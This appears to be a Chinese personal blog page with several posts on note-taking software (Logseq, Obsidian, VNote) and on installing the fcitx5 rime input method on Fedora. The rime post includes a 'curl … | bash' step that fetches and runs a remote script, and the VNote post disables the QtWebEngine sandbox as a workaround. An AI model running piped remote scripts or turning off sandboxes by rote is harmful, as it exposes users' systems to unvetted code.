<p>使用插件系统的方法和上面安装皮肤的步骤大致相同，依次点击 Plugins -&gt; Marketplace -&gt; Plugins ，选择插件点击 <code>Install</code> 即可。要加载 <code>unpacked plugin</code> 首先要打开开发者模式 Settings  -&gt;  Advanced -&gt; Developer mode ,  设置为打开。打开后使用插件管理系统 Plugins -&gt; Installed -&gt; Load unpacked plugin 选择相关目录就可以了。</p>
<p>具体的插件可以参考 <a target="_blank" rel="noopener" href="https://github.com/logseq/awesome-logseq#Plugins">https://github.com/logseq/awesome-logseq#Plugins</a> 记录的插件都挺不错的。</p>
<p>值得一提的是，插件系统的网络不太稳定（总所周知的原因），使用代理会方便一些。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https_proxy=127.0.0.1:3128 ./Logseq --proxy-server=http://127.0.0.1:3128</span><br></pre></td></tr></table></figure>

<p>安装插件可能会出现 timeout 错误，多重试几次就应该可以安装上了。</p>
<h2 id="query"><a href="#query" class="headerlink" title="query"></a>query</h2><p>query 算是 Logseq 的高级功能了，我用的也不多，输入 <code>/query</code> 回车就可以自动进入 query 了，具体的语法很灵活可以参考：<br><a target="_blank" rel="noopener" href="https://logseq.github.io/#/page/queries">https://logseq.github.io/#/page/queries</a></p>
<p>油管上有相关 video，大家可以参考一下：<br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=GDauxjx_bdA&ab_channel=OneStutteringMind">https://www.youtube.com/watch?v=GDauxjx_bdA&amp;ab_channel=OneStutteringMind</a><br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=qQ8DzumRZkM&ab_channel=OneStutteringMind">https://www.youtube.com/watch?v=qQ8DzumRZkM&amp;ab_channel=OneStutteringMind</a></p>
<h2 id="写在后面的话"><a href="#写在后面的话" class="headerlink" title="写在后面的话"></a>写在后面的话</h2><p>Logseq 的功能还是挺多的，两篇文章也不可能全部介绍完，官方文档总是最好的资料：<a target="_blank" rel="noopener" href="https://logseq.github.io/#/page/Contents">https://logseq.github.io/#/page/Contents</a></p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://logseq.github.io/">https://logseq.github.io</a></p>
<p><a target="_blank" rel="noopener" href="https://www.usmacd.com/cn/logseq/">https://www.usmacd.com/cn/logseq/</a><br><a target="_blank" rel="noopener" href="https://www.usmacd.com/cn/logseq3/">https://www.usmacd.com/cn/logseq3/</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/logseq/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="安全代码">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | 安全代码">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/cn/logseq/" class="post-title-link" itemprop="url">logseq 试用报告</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-02-21 00:00:00" itemprop="dateCreated datePublished" datetime="2022-02-21T00:00:00+08:00">2022-02-21</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>最近双链笔记的概念比较火热， Roam Research 大概是第一个实现此功能的软件，后续 Notion、Obsidian、logseq 等软件大步跟进，这些软件各有千秋。下面这段是参考资料文章中的一小段，很有参考意义：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Roam 的突破在于，理论上，把软件设计理念与卡片盒笔记法紧紧捆绑：</span><br><span class="line">卢曼（Niklas Luhmann）得益于卡片盒笔记法，从公务员成为德国当代重要的社会学家，</span><br><span class="line">因此基于卡片盒笔记法的 Roam 也可以助力你的成功；</span><br><span class="line">技术上，推出双向链接、可视化笔记间的联系、嵌入（Transclusion）等功能，</span><br><span class="line">让生产、查找笔记更加高效，于此同时，还省却维护层级结构的麻烦。</span><br></pre></td></tr></table></figure>
<p><img src="https://github.com/henices/pictures/raw/master/logseq0.jpg"><br><img src="https://github.com/henices/pictures/raw/master/logseq1.png"></p>
<p>上面两张图片就是<strong>卡片盒笔记法</strong> 最形象的表示了，个人觉得这种方法很适合自己。</p>
<p>为了体验双链笔记，我花费了不少时间，上面的几个软件都体验了一下，Roam 是收费软件，银子不够所以不选，Notion 笔记存储在云端，不符合我数据安全的要求也不选，剩下的就只有两个选项了 Obsidian 和 logseq 。</p>
<h2 id="Obsidian"><a href="#Obsidian" class="headerlink" title="Obsidian"></a>Obsidian</h2><p>软件主页：<a target="_blank" rel="noopener" href="https://obsidian.md/">https://obsidian.md/</a><br><img src="https://github.com/henices/pictures/raw/master/logseq2.png"></p>
<p>挺多人选择用 Obsidian 的原因是它的 MarkDown 语法支持得比较好，MarkDown 语法有很多的使用者，类似 Typora 的 MarkDown 笔记软件是当前笔记软件的主流，这使得这些笔记软件的使用者过渡到 obsidian 会比较平滑。我是开源MarkDown 笔记软件 Vnote 的重度使用者，一度想使用 Obsidian 作为主力软件。</p>
<p>Obsidian 有挺多优点，比如它对个人用户永久免费，但是它不开源，而且 <a target="_blank" rel="noopener" href="https://help.obsidian.md/How+to/Link+to+blocks">Link+to+blocks</a> 的语法比较别扭。最终还是没有选择它，有人说Obsidian 插件非常丰富，我自己没有折腾过。</p>
<h2 id="logseq"><a href="#logseq" class="headerlink" title="logseq"></a>logseq</h2><p>软件主页：<a target="_blank" rel="noopener" href="https://logseq.com/">https://logseq.com/</a><br>源码仓库：<a target="_blank" rel="noopener" href="https://github.com/logseq/logseq">https://github.com/logseq/logseq</a></p>
<p><img src="https://github.com/henices/pictures/raw/master/logseq3.png"></p>
<p>说了这么久终于到正主了，第一次知道双链笔记这个概念是因为有个网友在网上说使用效果不错，过渡很平滑。可能有先入为主的关系，另外我本人对开源软件一向有莫名的好感，所以主观意识上就很喜欢这个软件。logseq 的粒度足够，block reference 使用非常方便，另外 logseq 的 PDF 标记功能对于需要大量阅读论文的我来说非常好用。</p>
<p><img src="https://github.com/henices/pictures/raw/master/logseq4.png"></p>
<p>但是 logseq 也不是没有缺点，logseq 对 markdown 语法的支持不是很好，即使直接导入 MarkDown 文件，最后显示的结果感觉也是有问题，各类标题直接转化成 block 了，这是有问题的。但是从这个角度说 logseq 就是一个纯粹的双链笔记软件而不是一个添加了双链功能的 MarkDown 笔记软件。</p>
<h2 id="最终的笔记管理方法"><a href="#最终的笔记管理方法" class="headerlink" title="最终的笔记管理方法"></a>最终的笔记管理方法</h2><p>说到这，问题就简化了，平时的文档记录仍然使用 MarkDown 笔记软件，只是在平时记录的时候使用双链笔记软件。这样的笔记管理方法看上去比较麻烦，其实却很完美，想写文章的时候直接用 VNote，平时知识积累记录的时候就用 logseq，根本就不用过渡，只需要启用一个新软件即可。</p>
<p>基于 block 的双链笔记最大的好处就是没有输出负担，一些很随意的想法都可以记录下来，因为大家确实不可能每次都有大段的想法可以输出。有人说用 logseq一年写了 30万字，我开始觉得有点夸张，但是使用一个多月发现可能属实，现在我自己都写了几万字了。每个想法 (block) 之间可能会有联系，不断记录想法，不断联系，慢慢的真能发现一些意想不到的东西之间居然有联系，而这些联系很有可能是一些关键的底层逻辑。平时在记录的时候手工划分目录，层次关系，其实已经将一些想法，概念给逻辑化了，这样的记录方法很难摆脱固有的认知，而基于 block 的双链笔记就自由的多，不断记录，不断整理，汇总就交给软件来完成吧。</p>
<p>我现在已经通过 logseq 的记录想清楚了一些问题，在平时的工作记录中也不断地稳步螺旋推进，在此向大家推荐这款笔记软件。</p>
<h2 id="最后的话"><a href="#最后的话" class="headerlink" title="最后的话"></a>最后的话</h2><p>其实工具并不是那么重要，最重要的还是平时要记录，要定期输出。IT 界有一个著名的段子，你以为你是在写 blog 其实你只是在折腾 wordpress ：）</p>
<p>共勉。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://sspai.com/post/69503">双链笔记软件推荐：Logseq 和它的五种用法</a><br><a target="_blank" rel="noopener" href="https://sspai.com/post/65273">请不要神化双链笔记</a></p>
<p><a target="_blank" rel="noopener" href="https://www.usmacd.com/cn/logseq2/">https://www.usmacd.com/cn/logseq2/</a><br><a target="_blank" rel="noopener" href="https://www.usmacd.com/cn/logseq3/">https://www.usmacd.com/cn/logseq3/</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/vnote/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="安全代码">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | 安全代码">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/cn/vnote/" class="post-title-link" itemprop="url">Markdown 笔记软件： VNote</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-11-29 00:00:00" itemprop="dateCreated datePublished" datetime="2021-11-29T00:00:00+08:00">2021-11-29</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-08-02 00:00:00" itemprop="dateModified" datetime="2022-08-02T00:00:00+08:00">2022-08-02</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>向大家安利一款 markdown 笔记软件， VNote <a target="_blank" rel="noopener" href="https://github.com/vnotex/vnote">https://github.com/vnotex/vnote</a><br>此软件目前已经 1300 多个commits 了，做为一个有些开源软件维护经历的人，深感不易。<br>用了太多 markdown 笔记软件，此软件使得最为顺手，尤其作为程序员 vim 模式 让我感到非常舒服，<br>大量图表的支持比如 UML 流程图，让我用起来很顺手。</p>
<p>Vnote 分为两个开发阶段，阶段一 vnote2 已经开发完成：<a target="_blank" rel="noopener" href="https://github.com/vnotex/vnote/tree/vnote2">https://github.com/vnotex/vnote/tree/vnote2</a><br>现在处于第二个开发阶段：<a target="_blank" rel="noopener" href="https://github.com/vnotex/vnote">https://github.com/vnotex/vnote</a></p>
<p>据说后续会出收费版本，但目前看还需要很长的一段时间了。</p>
<p><img src="https://raw.githubusercontent.com/henices/pictures/master/vnote.png" alt="VNote"></p>
<p>我前后尝试过各种笔记软件，我理想的软件有几点：</p>
<ul>
<li>a. 支持文件管理</li>
<li>b. 不要乱改数据，容易迁移</li>
<li>c. 支持 markdown</li>
<li>d. 跨平台，支持 Mac 和 Linux</li>
</ul>
<p>最后，终于发现了 VNote，有点惊喜。在 Linux 下编译 VNote 显示有明显改进，下面是编译的方法：</p>
<ol>
<li>下载 QT SDK  （最新的 vnotex 官方支持 Qt 5.15.2，可自行下载使用替换相应的版本即可）</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://mirrors4.tuna.tsinghua.edu.cn/qt/official_releases/qt/5.9/5.9.0/qt-opensource-linux-x64-5.9.0.run">https://mirrors4.tuna.tsinghua.edu.cn/qt/official_releases/qt/5.9/5.9.0/qt-opensource-linux-x64-5.9.0.run</a></p>
<p>将 Qt5.9 安装到 &#x2F;home&#x2F;henices&#x2F;Qt5.9.0&#x2F;</p>
<ol start="2">
<li>编译 fcitx-qt5 （如果使用的是 fcitx5，需要下载编译 fcitx5-qt）</li>
</ol>
<p>git clone <a target="_blank" rel="noopener" href="https://gitlab.com/fcitx/fcitx-qt5.git">https://gitlab.com/fcitx/fcitx-qt5.git</a></p>
<p>准备编译脚本 <code>build_linux.sh</code>， 指定下载的QT</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">QTDIR=<span class="string">&quot;/home/henices/Qt5.9.0/5.9/gcc_64/&quot;</span></span><br><span class="line">PATH=<span class="string">&quot;<span class="variable">$QTDIR</span>/bin:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line">LDFLAGS=-L<span class="variable">$QTDIR</span>/lib</span><br><span class="line">CPPFLAGS=-I<span class="variable">$QTDIR</span>/include</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf build</span><br><span class="line"><span class="built_in">mkdir</span> -p build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">cmake ..</span><br><span class="line">make -j8</span><br></pre></td></tr></table></figure>

<p>使用下面命令编译</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> a+x ./build_linux.sh</span><br><span class="line">./build_linux.sh</span><br></pre></td></tr></table></figure>

<p>将生成的 libfcitxplatforminputcontextplugin.so copy 到<br><code>/home/henices/Qt5.9.0/5.9/gcc_64/plugins/platforminputcontexts/</code></p>
<ol start="3">
<li>获取VNote 源码</li>
</ol>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/tamlok/vnote.git vnote.git</span><br><span class="line"><span class="built_in">cd</span> vnote.git</span><br><span class="line">git submodule update --init</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>编译</li>
</ol>
<p>build_linux.sh</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">QTDIR=<span class="string">&quot;/home/henices/Qt5.9.0/5.9/gcc_64/&quot;</span></span><br><span class="line">PATH=<span class="string">&quot;<span class="variable">$QTDIR</span>/bin:<span class="variable">$PATH</span>&quot;</span></span><br><span class="line">LDFLAGS=-L<span class="variable">$QTDIR</span>/lib</span><br><span class="line">CPPFLAGS=-I<span class="variable">$QTDIR</span>/include</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf build</span><br><span class="line"><span class="built_in">mkdir</span> -p build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">qmake -v</span><br><span class="line">qmake PREFIX=/usr/local CONFIG-=debug CONFIG+=release ../VNote.pro</span><br><span class="line">make -j8</span><br></pre></td></tr></table></figure>

<p>使用下面命令编译</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod a+x ./build_linux.sh</span><br><span class="line">./build_linux.sh</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>安装</li>
</ol>
<p><code>sudo make install</code></p>
<h2 id="诡异问题"><a href="#诡异问题" class="headerlink" title="诡异问题"></a>诡异问题</h2><p>Fedora 升级到 35 后，Vnote 出现了一系列问题</p>
<ol>
<li><p>vnote 的阅读模式不能正常显示 （Qt 5.12.11）</p>
<p>解决这个问题需要禁用 Qtwebengine 的 sandbox</p>
</li>
</ol>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./vnote --no-sandbox</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>导出 pdf 文件 cpu 100%  （Fedora 系统自带 Qt 5.15.2 编译）</li>
<li>官方提供的 Linux AppImage 文件无法打开 Fcitx5 输入法。</li>
</ol>
<p>最终解决问题的方法是下载 Qt5.15.2 重新编译 Vnote， Qt 从 5.15 开始不提供离线安装包，非常不方便。<br>官方提供的在线升级包如果太新只能安装 Qt 6，所以必须下载老版本的 online installer<br><a target="_blank" rel="noopener" href="https://download.qt.io/archive/online_installers/4.0/qt-unified-linux-x64-4.0.1-1-online.run">https://download.qt.io/archive/online_installers/4.0/qt-unified-linux-x64-4.0.1-1-online.run</a></p>
<p>具体内容可以参考 <a target="_blank" rel="noopener" href="https://github.com/vnotex/vnote/issues/1942">https://github.com/vnotex/vnote/issues/1942</a> 的讨论</p>
<p>2022.8.2 更新</p>
<p>导出 pdf 文件 cpu 100% 的问题，我调试 Qt 5.15.5 代码时已经解决，可以参考：<br><a target="_blank" rel="noopener" href="https://github.com/vnotex/vnote/commit/53e2b3bfa8aff4f590471caf5e8cc55c8b8b538b">https://github.com/vnotex/vnote/commit/53e2b3bfa8aff4f590471caf5e8cc55c8b8b538b</a></p>
<h3 id="Qt-5-15-3"><a href="#Qt-5-15-3" class="headerlink" title="Qt 5.15.3"></a>Qt 5.15.3</h3><p>使用 Qt 5.15.3 编译 VNOte 后，出现下面的报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[695784:695784:0401/181224.580254:ERROR:network_service_instance_impl.cc(286)] Network service crashed, restarting service.</span><br></pre></td></tr></table></figure>

<p>bug 在这 <a target="_blank" rel="noopener" href="https://bugreports.qt.io/browse/QTBUG-91715">https://bugreports.qt.io/browse/QTBUG-91715</a> 可以先使用环境变量救急一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QTWEBENGINE_DISABLE_SANDBOX=1 QTWEBENGINE_CHROMIUM_FLAGS=--lang=de ./vnote --no-sandbox --disable-gpu</span><br></pre></td></tr></table></figure>

<p>2022.8.2 更新</p>
<p>Qt 5.15.5 已经修复了这个问题。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://tamlok.gitee.io/vnote/zh_cn/#!docs/%E5%BC%80%E5%8F%91%E8%80%85/%E6%9E%84%E5%BB%BAVNote.md">https://tamlok.gitee.io/vnote/zh_cn/#!docs/%E5%BC%80%E5%8F%91%E8%80%85/%E6%9E%84%E5%BB%BAVNote.md</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/cn/fcitx5-rime/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="安全代码">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | 安全代码">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/cn/fcitx5-rime/" class="post-title-link" itemprop="url">fedora 上安装 fcitx5 rime</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-07-26 00:00:00" itemprop="dateCreated datePublished" datetime="2021-07-26T00:00:00+08:00">2021-07-26</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2023-01-04 00:00:00" itemprop="dateModified" datetime="2023-01-04T00:00:00+08:00">2023-01-04</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>现在 fcitx 已经升级到了 fcitx5, 本来用着 fcitx4 挺好，也没有想着升级，在折腾 fcitx.vim 的时候发现 fcitx 居然升级了，<br>使得我的 vim 插件无法正常工作了，一顿折腾，本来以为很简单没想到进了个大坑 。<br>主要是不愿意放弃我的一万多行的 rime 用户词库，多年的积累了，不过 Linux 用户不就是老折腾吗， 唉。</p>
<p>fcitx5-rime 的默认的配置目录已经变为 <code>~/.local/share/fcitx5/rime</code>， fcitx4 默认的配置目录是 <code>~/.config/fcitx/rime</code></p>
<h2 id="安装-fcitx5-和-fcitx5-rime"><a href="#安装-fcitx5-和-fcitx5-rime" class="headerlink" title="安装 fcitx5 和 fcitx5 rime"></a>安装 fcitx5 和 fcitx5 rime</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo dnf install -y fcitx5 fcitx5-autostart fcitx5-chinese-addons fcitx5-configtool fcitx5-gtk fcitx5-qt</span><br><span class="line">sudo dnf install -y fcitx5-rime</span><br></pre></td></tr></table></figure>

<p>Fedora dnf 已经默认有 fcitx5-rime 的安装包了，不用自己重新编译了，非常不错。 <code>fcitx5-chinese-addons </code><br>为 fcitx5 自己默认带的中文输入法，这些和 rime 没有什么关系，网络上有人说， fcitx 的中文输入较以前有较大改进。<br><code>fcitx5-autostart</code> 用于自启动。后面发现系统自带的启动环境变量好像设置的有问题，不安装其实也没有什么问题，<br>自己手动执行 <code>fcitx5 -d</code> 即可。</p>
<h2 id="设置正确的环境变量"><a href="#设置正确的环境变量" class="headerlink" title="设置正确的环境变量"></a>设置正确的环境变量</h2><p>修改  <code>~/.xprofile</code>， <code>~/.zshrc</code> ， <code>/etc/profile</code> 等文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export GTK_IM_MODULE=fcitx5</span><br><span class="line">export QT_IM_MODULE=fcitx5</span><br><span class="line">export XMODIFIERS=&quot;@im=fcitx5&quot;</span><br></pre></td></tr></table></figure>

<h2 id="编译-fcitx5-qt5"><a href="#编译-fcitx5-qt5" class="headerlink" title="编译 fcitx5-qt5"></a>编译 fcitx5-qt5</h2><p>为了使我们自己编译的 vnote 可以正常使用 fcitx5， 需要编译 fcitx5-qt，新版的代码需要安装依赖 qt5-qtbase-private-devel 要不会出现 Parse error at “IID” 的错误。</p>
<p><code>sudo dnf install qt5-qtbase-private-devel.x86_64</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com:fcitx/fcitx5-qt.git</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &lt;&lt; <span class="string">EOF &gt; build_linux.sh</span></span><br><span class="line"><span class="string">QTDIR=&quot;/home/henices/Qt5.12.9/5.12.9/gcc_64/&quot;</span></span><br><span class="line"><span class="string">PATH=&quot;$QTDIR/bin:$PATH&quot;</span></span><br><span class="line"><span class="string">LDFLAGS=-L$QTDIR/lib</span></span><br><span class="line"><span class="string">CPPFLAGS=-I$QTDIR/include</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">rm -rf build</span></span><br><span class="line"><span class="string">mkdir -p build</span></span><br><span class="line"><span class="string">cd build</span></span><br><span class="line"><span class="string">cmake ..</span></span><br><span class="line"><span class="string">make -j8</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">bash build_linux.sh</span><br></pre></td></tr></table></figure>

<p>编译完成后将生成的 so 文件 copy 到 qt 的插件目录： </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> build</span><br><span class="line"><span class="built_in">cp</span> ./qt5/platforminputcontext/libfcitx5platforminputcontextplugin.so /home/henices/Qt5.12.9/5.12.9/gcc_64/plugins/platforminputcontexts/</span><br></pre></td></tr></table></figure>

<h2 id="配置中文环境"><a href="#配置中文环境" class="headerlink" title="配置中文环境"></a>配置中文环境</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/locale.conf</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> LANG=<span class="string">&quot;zh_CN.UTF-8&quot;</span></span><br><span class="line"><span class="built_in">export</span> LC_CTYPE=<span class="string">&quot;zh_CN.UTF-8&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="安装-rime-词库"><a href="#安装-rime-词库" class="headerlink" title="安装 rime 词库"></a>安装 rime 词库</h2><p>rime 现在已经使用 plum 管理词库，如果需要安装双拼输入法的，可以执行下面的命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://git.io/rime-install | bash</span><br><span class="line">rime_frontend=fcitx5-rime bash rime-install double_pinyin</span><br></pre></td></tr></table></figure>

<p>rime 为了保证输入速度，词库很小，为了能够自动显示更多的词组，就需要使用拓展词库。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/rime-aca/dictionaries.git</span><br><span class="line"><span class="built_in">cp</span> dictionaries/luna_pinyin.dict/* ~/.local/share/fcitx5/rime/</span><br></pre></td></tr></table></figure>

<p>安装了上面的拓展词库后，输入特殊符号的能力还是比较弱，需要把 symbols.yaml 也给加进来。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/rime/rime-prelude">https://github.com/rime/rime-prelude</a> 提供了我们所需要的 symbols.yaml 和 default.yaml,<br>可以使用 <a target="_blank" rel="noopener" href="https://github.com/rime/plum">東風破</a> 安裝： <code>rime_frontend=fcitx5-rime bash rime-install prelude</code></p>
<p>由于我们使用的是自然码双拼，需要修改的文件为 <code>double_pinyin.custom.yaml</code></p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">patch:</span></span><br><span class="line">  <span class="comment"># 載入朙月拼音擴充詞庫</span></span><br><span class="line">  <span class="attr">&quot;translator/dictionary&quot;:</span> <span class="string">luna_pinyin.extended</span></span><br><span class="line">  <span class="attr">&quot;punctuator/import_preset&quot;:</span> <span class="string">symbols</span></span><br><span class="line">  <span class="attr">&quot;recognizer/patterns/punct&quot;:</span> <span class="string">&quot;^/([A-Z|a-z]*|[0-9]|10)$&quot;</span></span><br></pre></td></tr></table></figure>

<p>设置完成后，要重新启动输入法，比如要输入 ☆ ，输入  <code>/xh</code> 即可</p>
<h2 id="将用户词库导入-rime"><a href="#将用户词库导入-rime" class="headerlink" title="将用户词库导入 rime"></a>将用户词库导入 rime</h2><p><code>rime_dict_manager -i luna_pinyin luna_pinyin.userdb.txt</code></p>
<p>这一步很关键啊，多年的积累不能浪费了。</p>
<h2 id="配置-fcitx5-皮肤"><a href="#配置-fcitx5-皮肤" class="headerlink" title="配置 fcitx5 皮肤"></a>配置 fcitx5 皮肤</h2><p>fcitx5 默认的皮肤不太好看，所以下载更新了皮肤，这款简约风格的皮肤非常符合老夫的胃口。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/thep0y/fcitx5-themes.git</span><br><span class="line"><span class="built_in">cp</span> spring ~/.local/share/fcitx5/themes -r</span><br></pre></td></tr></table></figure>

<p>修改配置文件 <code>~/.config/fcitx5/conf/classicui.conf</code></p>
